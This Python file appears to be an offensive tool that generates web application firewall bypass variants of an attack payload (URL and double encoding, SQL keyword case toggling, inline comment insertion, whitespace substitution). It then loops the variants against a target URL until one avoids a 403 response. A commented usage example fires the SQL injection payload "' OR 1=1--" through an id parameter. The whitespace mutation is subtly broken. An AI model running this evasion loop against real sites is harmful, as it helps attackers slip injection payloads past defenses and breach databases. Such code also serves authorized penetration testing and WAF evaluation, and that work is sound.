import urllib.parse
import random
import binascii

class Mutator:
    @staticmethod
    def mutate(payload):
        """
        Generates variations of the input payload using WAF bypass techniques.
        """
        mutations = set()
        mutations.add(payload) # Original
        
        # 1. URL Encoding (Standard)
        mutations.add(urllib.parse.quote(payload))
        
        # 2. URL Encoding (Double)
        mutations.add(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # 3. Case Toggling (Sqli -> SqLi)
        # Randomly toggle case for standard SQL keywords if detected
        upper_payload = payload.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN").replace("OR", "oR").replace("AND", "aNd")
        mutations.add(upper_payload)
        
        # 4. Comment Injection (Sqli -> S/**/QLi)
        # Simple inline comment insertion
        comment_payload = payload.replace(" ", "/**/")
        mutations.add(comment_payload)
        
        # 5. Whitespace Roulette (Tabs, Newlines)
        whitespace_payload = payload.replace(" ", "%09").replace(" ", "%0a")
        mutations.add(urllib.parse.unquote(whitespace_payload)) # Add as raw char
        
        return list(mutations)

class Evolver:
    def __init__(self, session):
        self.session = session
        
    async def attempt_bypass(self, url, original_payload, check_function):
        """
        Genetic Loop:
        1. Mutate Payload
        2. Test all mutations
        3. If ANY mutation bypasses (not 403), return it.
        """
        population = Mutator.mutate(original_payload)
        
        for variant in population:
            # We assume check_function takes (url, payload) and returns (bypassed, info)
            # Or we just run it manually here?
            # Let's run a simple check: is it 403?
            
            # Construct URL
            # This is tricky because we don't know WHERE the payload goes (param, header?)
            # So 'check_function' callback is better.
            
            success = await check_function(variant)
            if success:
                return variant # Found a winner!
                
        return None # No mutation worked

# Usage Example:
# async def my_checker(payload):
#    async with session.get(url + "?id=" + payload) as resp:
#        if resp.status != 403: return True
#    return False
#
# winner = await Evolver(s).attempt_bypass(url, "' OR 1=1--", my_checker)
